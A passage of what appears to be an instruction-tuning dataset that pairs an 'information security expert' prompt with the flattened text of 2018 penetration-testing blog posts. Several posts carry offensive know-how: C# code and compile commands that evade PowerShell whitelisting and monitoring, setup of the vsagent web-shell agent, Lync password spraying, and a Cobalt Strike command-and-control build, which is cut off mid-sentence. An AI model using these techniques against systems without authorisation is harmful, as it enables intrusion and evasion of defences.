reader that supports the HID Indala card format and the latter operates at 13.56 MHz supporting HID iClass cards The combination of all three of these devices can be a valuable asset on physical penetration tests When used with the BLEKey and other physical security bypass tools and techniques they can give a customer a comprehensive understanding of any weaknesses in their physical security posture"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Scan Millions of IPv4 Addresses for Vulnerabilities</title>\n<taxonomies>Author, External/Internal, How-To, Jordan Drysdale, Web App, Digital Ocean, Jordan Drysdale, Nessus, Vulnerability Scanning</taxonomies>\n<creation_date>Thu, 15 Feb 2018 16:38:43 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale Some days are not like others Some days you might get tasked with scanning a million IP addresses Here's how I did it Digital Ocean Amazon is too picky about their rules for inbound and outbound traffic I don't want to piss off the third or fourth largest corporation on Earth Politically speaking there's always scan schedules and certain elements that have to be scanned at certain times of the day based on our position in the heliocentric orbit lunar year whatever On the DO box use reject entries in the rules file More later Mathematically using the top ports from Nessus reference document linked here ocs.tenable.com nessus 6_11 Content DiscoverySettings.htm ...default scan policy instructs Nessus to scan approximately 4 790 commonly used ports then we have 4.7 billion sockets to check per million IP addresses Now we are getting somewhere Let's spin some nodes up say five at the 40 bucks per month rate The test scan averages came in at about 30 minutes per 22 1024 IPs 1022 hosts This block of IPs generated responses from about a hundred hosts which seemed to be standard across the test runs Further we moved toward accomplishing our task in a week How many nodes could scan how many IPs in how much time Last Using a PCI Quarterly scan profile will keep you out of trouble in a court if you are asked to explain to a judge why you dumped a customer's primary money making web application Custom scan profiles can make this explanation difficult Let's go through some finer points of the math If we want to scan a million IP addresses where do we start considering we have our baseline defined 1000000 IPs total each 22 or 1024 hosts average scan length came in at 30 minutes 1000000 1024 30 29297 minutes or 488 hours of scan time If we have five scanners we are at 97 hours of scanning per instance Then use a Nessus merge script to combine all the .nessus files into a single scan combo and upload From a case study perspective comparing the results of a million IP vulnerability results is identical to reviewing the results of a thousand IP addresses"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>When Infosec and Weed Collide: Handling Administrative Actions Safely</title>\n<taxonomies>Author, Brian King, Informational, News, Web App, audit, authentication, government, legal, ohio, potheads, webapp, webapp test</taxonomies>\n<creation_date>Tue, 20 Feb 2018 15:29:33 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "BB King The state of Ohio recently validated a webapp pentest finding that sometimes goes overlooked It relates to the details of administrative functions how they can be abused and how just the potential for abuse can call all of your data into question Here's what they found COLUMBUS Ohio A critical flaw in Ohio's process for grading medical marijuana grow applications could have allowed a state employee to change scores or manipulate other documents the state auditor's office found Two Ohio Department of Commerce employees had unlimited access to the online accounts of more than 20 application reviewers and associated documents according to Auditor Dave Yost's office The employees also created and managed passwords for the application reviewers who were only granted access to certain parts of the application In a Feb 6 letter to Commerce Director Jacqueline Williams Yost wrote that the weakness could have allowed an employee to log in as a reviewer and change scores The weakness as Yost refers to it means auditors can't tell whether a record was revised by an application reviewer or someone else logging in as the reviewer Source ww.cleveland.com metro index.ssf 2018 02 ohio_auditor_finds_flaw_in_med.html Administrators need to be able to create user accounts In some situations they also need to be able to reset passwords In still other cases they may need the ability to impersonate another user in order to diagnose a problem to provide training or help resolve problems in real-time All of these things are legitimate needs but each of them if done poorly can poison your audit trails making it impossible to determine who did what in the application and making your application's data completely unreliable Any time an administrator does anything on behalf of another user it's important that the event is logged as such Investigators must be able to tell that a second user was involved who that second user was what that user did and when it was done Without such logging it becomes impossible to know for sure who took any given action How serious a problem is that It depends on what you want to be able to do with your data and what responsibilities your users may have to ensure that they're doing things correctly whatever that means for your situation The Auditor for the State of Ohio summarized the problem This control weakness could allow an administrator access to manipulate documents while logged in as an account holder rather than their own administrative account Because of this critical flaw in the procedure's design neither this office nor the public can rely upon the results Source ssets.documentcloud.org documents 4377305 2-6-18-Commerce-Letter-Director-Williams-2.pdf When an administrator has access to user credentials the administrator can untraceably impersonate that user Credentials are not just username and password but anything that gives access to an account In a webapp the session cookie is a credential If you're storing user passwords in cleartext or any other way that allows them to be used as-is from the database the problem goes far beyond the auditing issue Even showing a password hash though as some admin panels do can approximate the same problem Hashes can be cracked For audit purposes a hash revealed may have to be treated as a password revealed There are more resilient ways to handle the need for administrative access to accounts Password self-service where a user can change or reset their own password by proving their identity to the application through use of a shared secret Where an administrator must be involved in password resets the user should be forced to change that password before doing anything else in the application Use of ride-along functionality for technical support When an administrator needs to see exactly what a user is seeing the application can be built such that the user must invite the administrator into their session and actively allow them to control it This grant of permission would be recorded and all events while the administrator is alongside would be flagged as such clearly identifying both people involved in the session Use of on behalf of signons In the rare cases where there is a need for an administrator to use another person's account that must not mean the administrator gets access to the user's credentials An impersonation system that clearly records which person was at the keyboard during the events of that session is required In sensitive cases this notation should be displayed alongside the relevant data in the UI so that it cannot be missed Full disclosure BHIS was not involved with this action by the State of Ohio in any way We just noticed it in the news"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>504 VSAgent Usage Instructions</title>\n<taxonomies>Author, How-To, Informational, Jordan Drysdale, Digital Ocean, Jordan Drysdale, SANS SEC504, vsagent</taxonomies>\n<creation_date>Mon, 26 Feb 2018 15:27:07 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale HERE IT IS Finally For the vsagent from SANS SEC504 only the finest InfoSec course the world has ever seen this is a Q D deployment guide for the HTTP view state agent demonstrated in the SANS SEC504 labs The README.md file in the repo has everything you need to get vsagent running for your enjoyment analysis and review in a matter of minutes First spin up a new Digital Ocean Ubuntu node and capture the IP We generally throw DNS records at things and if you haven't integrated your GoDaddy DNS with Digital Ocean's now is the time SSH over to your new node and run a few commands Clone the repo with the following git clone ithub.com rev10d 504vsa.git For Debian Ubuntu install some required packages apt install nginx php7.0-fpm php7.0-sqlite sqlite Next put this chunk into etc nginx sites-available default location .php include snippets fastcgi-php.conf fastcgi_pass unix run php php7.0-fpm.sock Modify ownership of the web files so things work right chown -R www-data www-data opt course_www vsagent-504 Trash the existing database to start fresh rm opt course_www vsagent-504 server data.db Restart nginx service nginx restart Launch your vsagent with python works on Windows Linux and Mac python vsagent-504.py 27.0.0.1 vssvc.php Last up check out the 27.0.0.1 vsgui.php service on your IP Shells brought to you by SANS SEC504 the world's finest InfoSec security program"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>PowerShell w/o PowerShell Simplified</title>\n<taxonomies>Author, Brian Fehrman, How-To, Informational, InfoSec 101, Application Whitelisting Software, AWS, PowerShell</taxonomies>\n<creation_date>Thu, 01 Mar 2018 15:29:22 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Brian Fehrman In a previous post titled PowerShell without PowerShell we showed you how you can bypass Application Whitelisting Software AWS PowerShell restrictions monitoring and Command Prompt restrictions In some cases you might not need all of that you might just need a way to bypass PowerShell restrictions and or monitoring This post presents a simple solution for the aforementioned scenario This approach is not new but this post attempts to present it in a plain straight-forward way The sections are as follows Code The code needed for this solution Compilation The OS-Dependent commands to compile the code Usage Instructions on compilation special configuration of PowerShell files and execution of the program and PowerShell scripts Code prog.cs Usage prog.exe path_to_powershell_file using System using System.Configuration.Install using System.Runtime.InteropServices using System.Management.Automation.Runspaces public class Program public static void Main string args Mycode.Exec args 0 public class Mycode public static void Exec string file string command System.IO.File.ReadAllText file RunspaceConfiguration rspacecfg RunspaceConfiguration.Create Runspace rspace RunspaceFactory.CreateRunspace rspacecfg rspace.Open Pipeline pipeline rspace.CreatePipeline pipeline.Commands.AddScript command pipeline.Invoke Compilation Windows 7 x64 C Windows Microsoft.NET Framework64 v2.0.50727 csc.exe r C Windows assembly GAC_MSIL System.Management.Automation 1.0.0.0__31bf3856ad364e35 System.Management.Automation.dll unsafe platform anycpu out C Users Public prog.exe C Users Public prog.cs Windows 7 x86 C Windows Microsoft.NET Framework v2.0.50727 csc.exe r C Windows assembly GAC_MSIL System.Management.Automation 1.0.0.0__31bf3856ad364e35 System.Management.Automation.dll unsafe platform anycpu out C Users Public prog.exe C Users Public prog.cs Windows 10 x64 C Windows Microsoft.NET Framework64 v4.0.30319 csc.exe r C Windows assembly GAC_MSIL System.Management.Automation 1.0.0.0__31bf3856ad364e35 System.Management.Automation.dll unsafe platform anycpu out C Users Public prog.exe C Users Public prog.cs Windows 10 x86 C Windows Microsoft.NET Framework v4.0.30319 csc.exe r C Windows assembly GAC_MSIL System.Management.Automation 1.0.0.0__31bf3856ad364e35 System.Management.Automation.dll unsafe platform anycpu out C Users Public prog.exe C Users Public prog.cs Usage Create a file named C Users Public code.cs Copy and paste the code from the Code Section above into the code.cs file Open a Windows Command Prompt and compile the program by copying and pasting the command above that is appropriate to your OS In the PowerShell script that you wish to run place the function call that you would normally use to run the script at the bottom of the script For instance say that you wanted to run Invoke-AllChecks from PowerUp.ps1 I typically do the following Invoke-AllChecks -Verbose Out-File C Users Public allchecks.txt To do the same with this program you would need to copy the command above and paste it at the bottom of the PowerUp.ps1 file Once you've placed your function call at the bottom of your target PowerShell script run the program and script with the following command from the Windows Command Prompt C Users Public prog.exe C Users Public PowerUp.ps1 Note that you need to change C Users Public PowerUp.ps1 to be the name of the PowerShell script that you would like to run Conclusion This short and hopefully simple post presented a quick solution to executing PowerShell scripts in environments where PowerShell usage is restricted and or is being monitored This approach gives additional reasons for why companies should consider implementing stricter AWS policies in their environment"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Build a Better Relationship With Your C-level Regarding Information Security</title>\n<taxonomies>How-To, InfoSec 101, c-level, c-Suite, information security, infosec, infosec 101</taxonomies>\n<creation_date>Mon, 05 Mar 2018 16:36:31 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Josh Thomas Editor's Note Recently on Twitter we asked our followers What's the hardest thing to get your C-level to understand regarding security The answers came in like a roaring flood Hopefully this helps you towards a path that helps improve your relationship with your c-level and in return alleviate some of those frustrations One of the more challenging things that those of us working in the cyber security information security realm routinely face is convincing the C-Suite of the value that we bring to an organization and how we can play a vital role in an organization's success If we are lucky we are working for a CISO who understands the evolving threat landscape and has the ear and support of a CEO CIO CFO CMO C-something or other If we aren't so lucky we are faced with pushback intense scrutiny about the projects we pursue to improve our organization's security posture and even worse contempt Why are we paying these cyber guys big buck and why are they always asking for more budget Don't they know they are a cost center This is probably a reaction we've all run up against at one point or another So what are some things we as a profession can do to improve the understanding with the C-Suite as to why security is important See below for some of my ideas The People Problem Anyone who's spent more than five minutes in an InfoSec role has seen it Most of us have restless nights because of it More often than not organizations simply don't have enough people trained to do the job effectively This leads to employee burnout and disgruntlement There isn't a more dangerous scenario that comes to my mind than a disgruntled security analyst with DA creds At the C-Suite level it's imperative that they understand running thin on staff ultimately leads to people walking out the door An analogy that I will often use with any level of management is this you have to staff an InfoSec team like a fire department Now this may mean that you have a team that isn't at 100 utilization 100 of the time and that's ok When down time exists it creates the perfect opportunity for the staff to update and review procedural documentation get familiar with a new technology suite etc You know typically those tasks that get pushed to the back burner when we are at 100 utilization Getting back to my analogy while there are often times firefighters are hanging out at the fire house cleaning gear washing the truck and working out when the call for a five-alarm fire comes through the team is ready to go Staffing an InfoSec team should be thought of in the same way Security as a Differentiator A CEO should think of a robust security program as an opportunity to turn a cost center into a profit center While I would not suggest that a CEO release a press statement asserting their organization is infinitely secure and hacker-proof the C-Suite should use their respective organizations investments in information security as an opportunity to establish an increased level of trust with their customers and suppliers and as opening to outpace their competitors And this shouldn't stop with complying with the alphabet soup of regulations and compliance frameworks It is imperative to demonstrate that an organization has internally established vulnerability management programs submit themselves to routine internal and external pen tests have a well-defined and tested Incident Response program etc etc These characteristics and capabilities can and should be leveraged to attract new business and set that level of trust with clients partner organizations and future customers Not Set Forget Proposition Probably one of the larger misconceptions that plague the C-Suite is that if an organization is secure today they'll be secure tomorrow The sad reality that we all know all too well is that the threat landscape is more volatile than the stock market It's our job to educate our C-Suite on that dynamic and harsh reality More importantly we have to help them understand that being proactive and having systems in place to combat an ever-changing threat landscape ultimately leads to better protection of the corporate enterprise and is one facet to help ensure business continuity and minimal interruption to revenue streams Nothing will get the C-Suites attention quicker than walking them through multiple scenarios where the revenue stream is interrupted Transparency It's all too easy for us security folks to want to hide out in our cubicles and ruminate on how misunderstood our profession is amongst those at the top But don't work to open up the lines of communication with your organizations leadership Work to implement policies that balance security with business objectives throughout your organization Become a trusted advisor Hear about a new software development project in the works at the water cooler make some casual suggestions on some of the latest secure coding practices Oftentimes these informal conversations can lead to a fundamental shift in the way an organization does business and can help establish the need to bring security to the table at the onset of any new project Demonstrating that you're on the team and are sensitive to the needs of the business can go a long way in establishing an InfoSec team as a trusted insider operating with the businesses best interests in mind Training We get it training dollars can be scarce but it's an absolute necessity How do we demonstrate a Return on Investment with training dollars One way is by taking a train the trainer approach which can go a long way in expanding knowledge throughout an enterprise Staff members should come back from a training event and impart their knowledge to other members of the team While sending a staff member to a week-long training course on any one technology is great It's critical that knowledge doesn't walk out the door when that staff member gets hit by the proverbial bus Having documented how-to guides on all of the tools in the toolshed are used really helps address the knowledge gap that's created when someone walks out the door We should be sensitive to the fact that training is an investment that a company makes in us we owe it to ourselves to not let those knowledge sit on the shelf and gather dust Taking this approach helps justify the expense of future training opportunities to leadership It's the butterfly effect Tools and Automation The perception that a new application is all it takes to secure a company's IT infrastructure is shortsighted While I don't know a single IT InfoSec guy who doesn't like sitting in a dark room and configuring the newest firewall IDS DLP you name it solution the perception that your secure just because We've got an app for that is a dangerous one and with new technology comes new challenges InfoSec staff can help change that mentality by mapping out threat scenarios to each layer of the security onion Being able to demonstrate to leadership what is negatively impacted when any one layer of defense is not in place helps to alleviate this Having a security architecture in place that ties to specific threat scenarios gives the C-Suite a much better understanding of their risk profile and shows where defensive gaps exist It's on us to help steer them away from the We've got an app for that mentality and being able to communicate that to them succinctly and in a way that shows the negative impact to the bottom line is usually pretty effective Owning the Risk Much like the Captain of a ship is responsible for every aspect of operations on the ship The C-Suite and more specifically the CEO are tasked with the responsibility for all operations within their respective organization to include security Turning a blind eye to the possibility of cyber intrusions is not only negligent it's dangerous It's important that they understand that it's not a matter of if they'll be attacked it's a matter of when if not all already and how the organization reacts when an attack is identified Having established security protocols may keep the companies name from becoming the lead-in story on the nightly news And should that happen the C-Suite needs to have a Public Relations plan in place for managing the media That plan is just another layer of the security onion"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Small and Medium Business Security Strategies:  Part 3</title>\n<taxonomies>Author, How-To, Informational, InfoSec 101, Jordan Drysdale, INFOSEC 301 CRITICAL CONTROLS, it security, Jordan Drysdale, Small Business</taxonomies>\n<creation_date>Thu, 15 Mar 2018 14:00:40 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale Blurb A few of us have discussed the stress that small and medium business proprietors and operators feel these days We want to help stress you out even more Not really but if you aren't worrying about IT security you are probably doing it wrong This series will run through some of the important controls that IT pros have mapped out for us We are trying to present these in a way that you can accomplish them without dedicated IT staff Part 1 Introduction to SMB InfoSec Controls Part 2 Inventory controls of your network hardware CIS Critical Control 1 Inventory Part 2 Software You can do it You started this process by introducing your employees to a new year with an expectation that they are now participants in an information security transformation at your company You should have gathered hardware inventory and contact information for the hardware your company owns and leases You may have reached out to your various managed services vendors to find out what they know about your network Next up the software that keeps your business operational As a small business owner software maintenance can be a disaster You thought an IRS audit was bad Anyone ever received a Microsoft audit request form Plain and simple if you are running individually installed licensed and managed Microsoft Office products STOP It's time to budget for new systems that are licensed for Windows 10 Pro and go get Office 365 This will put your life in an entirely new focus This operating system will keep itself patched updated and rebooted with minimal effort The Office 365 product suite once up and running will do the same sans the reboots If you are reading these in order the Hardware Inventory post included spreadsheet examples Here's another one with prime examples of a software inventory list that most small and medium networks can start with This is going somewhere and it will matter later If the implementation of the first five from CSC 20 has you questioning your sanity take a step back and another deep breath This is the easy part Each department has unique needs Each department probably needs unique software No one should have the privilege to install software at will With a simple list of what software goes with which department you no longer have to allow Bob head janitor full privilege to install who knows what on his system The goal is to limit exposure and maintain accurate software inventory to allow an organization to secure system configurations If you don't know which departments need which software then everyone gets to be an admin and a single successful phish is likely game over This inventory management step is critical to ensure that no one on the network needs local administrator If you don't know why this matters if someone with local admin privilege clicks a link the first adversary tactic is to get local administrator privilege With this access all authenticated sessions are visible and those passwords are compromised This can lead to domain takeover and worse Is Managed IT Services sounding better"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>BHIS Caption This #2 Responses</title>\n<taxonomies>Fun & Games, BHIScaptionthis, Clowns, GifTweets</taxonomies>\n<creation_date>Fri, 16 Mar 2018 13:32:20 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "If you follow us on Twitter you might have noticed we started BHIScaptionthis on Fridays There were so many good responses last week that we thought we'd put them all here as well Be sure to join us today for another round One of the things we really love about this particular gif is that you kinda can't tell if he's scared happy excited terrified panicked or all of the above Your great captions show the range of emotions he could be feeling Thanks to everyone who participated"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>PSA: It's 10PM, Do You Know Where Your Lync Servers Are?</title>\n<taxonomies>Author, Brian Fehrman, General InfoSec Tips & Tricks, Informational, external engagement, Lync, Lync server</taxonomies>\n<creation_date>Mon, 19 Mar 2018 15:26:23 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Brian Fehrman Microsoft Lync servers have been a staple of my external engagements for the past six months or so I have found a Lync server on all of those engagements In most cases these portals have long been forgotten they are simply the discarded technology of yesteryear for many companies I have found numerous instances where monitoring was in place for nearly every asset Every asset...except the Lync server that is Lync servers can provide many goodies for an attacker All the same treasures that can be had with Outlook Web Access OWA portals can be had with Lync servers This includes internal-domain name disclosure user enumeration via the AD timing attack and even password spraying This blog post from TrustedSec has been my guiding light for my Lync adventures Rather than write a crappier version of the great work that they did I will simply point you to their blog ww.trustedsec.com 2017 08 attacking-self-hosted-skype-businessmicrosoft-lync-installations Enjoy"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Build a Command & Control Infrastructure with Digital Ocean: C2K Revamped</title>\n<taxonomies>C2, External/Internal, General InfoSec Tips & Tricks, How-To, InfoSec 201, InfoSec 301, Red Team, Red Team Tools, Social Engineering, C2, C2 Infrastructure, C2K, command and control, Digital Ocean</taxonomies>\n<creation_date>Thu, 22 Mar 2018 14:11:41 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Lee Kagan Expanding upon the previous post in this series I decided to rewrite C2K find it here to change its behavior and options for the user In this post we will walk through the changes to C2K as well as re-deploy a demo C2 infrastructure with all the new features It is worth noting that not everything demonstrated is automated or part of the C2K script There are also more capabilities being added into C2K that are currently in-progress C2K a.k.a Command and Control Kit is a bash script I put together to speed up the process of repeat C2 builds and tasks The new design allows for users to easily and quickly remove add or edit the features they require to get the job done Currently C2K provides the following capabilities Deploy Cobalt Strike team servers Deploy Apache mod_rewrite redirectors for HTTP C2 instances Add HTTPS support to HTTP C2 instances Configure firewall rules for C2 traffic Lockdown SSH access to C2 instances Configure terminal logging Configure Logwatch on C2 instances In this post we will use all of the above features as well as some manual additions such as Integrate Cobalt Strike beacon events into Slack Integrate Digital Ocean performance alerts into Slack Use Digital Ocean doctl CLI to create global infrastructure firewalls In order to use C2K and the manual alerting setup there are some requirements you will need before using it Digital Ocean account Digital Ocean API key Cobalt Strike license Slack Create Slack app for incoming webhook Domain and DNS management i.e GoDaddy The New C2K Walkthrough Let's take a look at the code and how C2K can be used The C2K pack contains 3 items which can pulled from GitHub c2k.sh The main script to execute HTTPsC2DoneRight.sh script from Killswitch_GUI to setup HTTPS support sshd_config custom SSHD configuration template for locking down SSH access NOTE You are responsible for your own copy of Cobalt Strike Leave the unpacked archive in the same folder as the above once you've downloaded everything Go ahead and open up c2k.sh and let's take a look inside Everything in the c2k.sh script is broken down into sections buckets and functions to allow the user to quickly and easily modify any of the content In the above image you'll need to set the following variables DOTOKEN place your Digital Ocean API key between the quotes NEWUSER place a username you will be using to log into the new droplets with over SSH between the quotes Everything for here on in is broken down by functions This makes it very easy to add remove edit commands and features The function func_getDependencies is a basic update and install some requirements In the odd event you don't have python installed it will add that too The function func_createUser will create the new user for SSH access and add that account to the sudoers group The function func_setupSSH will make the necessary changes to setup SSH access for the new user and move the existing key already on the droplet over to that user the existing SSH key is what you're using to login to the new droplet over root for the first time The function func_createDroplets is where the droplet creation magic happens It leverages the Digital Ocean API In the above image I've shown how to create multiple droplets at once If you wish to create one at a time just remove the second and third blocks starting with curl You'll need to set the YOUR_DROPLETS_HOSTNAME field for each droplet You can also set the region size and image as you require this has only been tested on Ubuntu 16.04 Finally you'll need to add your SSH key fingerprint in the YOUR_SSHKEY_FINGERPRINT field This can be obtained in the Digital Ocean control panel when you add your SSH key as we'll see later Because this script revolves around using Cobalt Strike the functions in the above image are all related to it but can be modified for your preferred framework i.e MSF or Empire The function func_getCSDependencies installs the Java requirement for Cobalt Strike The function func_installCobaltStrike unpacks and runs the installer which will prompt you for your license The function func_getMalleable will pull down Malleable C2 profiles into the unpacked Cobalt Strike directory The function func_addHTTPSSupport will run the HTTPsC2DoneRight.sh script It is important to restrict connectivity to your team servers In the above image there's a simple function called func_createFirewall to setup what ports are accessible This is not a rock solid firewall so it is encouraged to restrict access as needed NOTE we will also be looking at a global infrastructure firewall with doctl later on When selecting the HTTP redirector option in C2K the function in the above image func_createHTTPRedirector makes use of an excellent script courtesy of n0pe_sled This script will automate the process of configuring your HTTP redirection instance It is highly encouraged to visit the authors GitHub page ithub.com n0pe-sled Apache2-Mod-Rewrite-Setup to see all the options available In the above example the function will pull down the script as well as Malleable C2 profiles The script supports using Malleable profiles for redirection although in the above example it is not used The important fields to edit before using are the block_url and allow_url Add a domain which you wish to send traffic to that should not touch your team server or does not meet the redirection criteria Then add the C2 domain that traffic should be proxied to this is your HTTP C2 instance Finally the last function is func_installDefensiveTools This function is a starting point to add some defensive measures into your C2 instances First it installs lterm a great utility once again from Killswitch_GUI that records console activity and writes it out to file It will also install Logwatch and email you reports on what has been happening on your servers In the above image you will need to edit the 2 fields for your email address shown as your email.com You can also adjust any of the settings above for your preferred means to be notified when and what level of detail C2K Preparation Before executing C2K let's prepare everything we need to begin creating the infrastructure Here's the plan Domain s I'll be using ilikedemos com for this demonstration Need to set the A records for our different hosts 4 droplets these will be our simulated C2 instances Payload host Cobalt Strike instance for hosting downloads scripts implants etc HTTP host Cobalt Strike instance for receiving reverse HTTP beacons HTTP redirection host Apache mod_rewrite instance for proxying HTTPS host Cobalt Strike instance receiving reverse HTTPS beacons SSH Key will create a new SSH key and add to Digital Ocean Slack channel and webhook Cobalt Strike and Slack integration Aggressor script from bluscreenofjeff ithub.com bluscreenofjeff AggressorScripts Let's begin Starting with Digital Ocean log in to your account and we'll obtain the API key and add an SSH key to our profile Click API at the top of the page and create a new API key if you do not already have one by clicking Generate New Token Give your token a new name When it's created be sure to note down the key as it will only be displayed to you once If you lose it you'll need to generate a new token Next in your profiles security settings section create a new SSH key by clicking Add SSH Key or note down your existing SSH keys fingerprint Now would be a good time to update c2k.sh and add your Digital Ocean API key and SSH fingerprint We can now run the c2k.sh script and create the droplets for our C2 I'm going to create 4 droplets with the following settings All will be in nyc3 for this demo All will be 2gb although I recommend more for actual operations Hostnames for each will be payload.ilikedemos.com http.ilikedemos.com httpred.ilikedemos.com https.ilikedemos.com Select option 1 to automatically deploy the droplets you configured inside the script Once finished running check your Digital Ocean droplets page and you should see the newly created droplets Now would be a good time to update your A records for the domain s you will be using with the C2 infrastructure Next we need to transfer the C2K folder contents over to each machine you actually don't need to transfer Cobalt Strike over to the redirector In the image below repeat the SCP process for each droplet Once you're finished copying over the C2K pack to each droplet SSH in normally as root which will use the SSH key to login Before running the C2K script on the droplets I like to set a root password Because we'll be logging in over SSH later with the new user in the sudoers group should you want to directly elevate to root you'll have a password to do so although not really necessary Not all of the 4 droplets in this demonstration require the same selections in c2k.sh to be run Here's a breakdown of what I'll be executing on each Payload host Install Cobalt Strike install logging and defensive tools HTTP host Install Cobalt Strike install logging and defensive tools HTTPS host Install Cobalt Strike install HTTPS support install logging and defensive tools Be sure to have your A records set before running HTTPsC2DoneRight.sh Note this script will use by default the amazon.profile Malleable C2 profile with HTTPS support Be sure to edit this or run your HTTPS team server with that profile Once done stop Apache from running otherwise it will conflict with Cobalt Strike from standing up a listener HTTP redirector host Install HTTP redirection install logging and defensive tools Be sure to set the apache_mod_rewrite_setup flags in the c2k.sh script before running this option Also make note of the settings in the sshd_config template There's a custom SSH port and username set that you will need to change SSH port is up to you but be sure the NEWUSER variable in c2k.sh matches the AllowUser directive in the sshd_config template Once the c2k.sh script completes you will have to login over SSH once you disconnect using newusername droplet_address -p 7654 or whatever custom port you chose Once the script completes with the selections mentioned above disconnect and log back in with the new user account Once you've finished all the c2k.sh script options for each of your droplets let's add some more monitoring and alerting First let's add Digital Ocean Slack integration for droplet performance monitoring In your Digital Ocean control panel click Monitoring at the top navigation This should be blank to start with but also pay attention to the bottom of the above image There's a command we'll need to execute on each droplet we want to monitor performance on Before creating a new policy execute that command will integrate this into c2k.sh script soon Once done click Create alert policy Select a metric to alert on such as CPU then the threshold settings you desire Add your droplets by name or tag then select Connect Slack under the alerts section You'll need to authenticate to your Slack account and select a channel you wish to receive alerts to Once done click Create alert policy The images below show the result on Digital Ocean and Slack Great Now we'll integrate alerts from Cobalt Strikes beacon into the same Slack channel as well You'll need to create a new Slack app and note down the webhook to add into Cobalt Strike This process can be followed along with the excellent post from bluescreenofjeff here luescreenofjeff.com 2017-04-11-slack-bots-for-trolls-and-work Go to your Slack accounts app page and select Create an App Give your app a name and the Slack channel you wish to receive alerts in the click Create App In the next page that will appear select Incoming Webhooks On the Webhooks page you'll need to toggle it on in order to activate the feature Once enabled towards the bottom of the page you'll want to select and create a new Webhook Click Add new Webhook to Workspace and in the popup window select the same channel or different if you prefer in Slack to receive the alerts to Once done your new Webhook URL will be displayed Make a note of this as you'll need it to enter into the Aggressor script for Cobalt Strike Now all that's left is to test out our C2 infrastructure and make 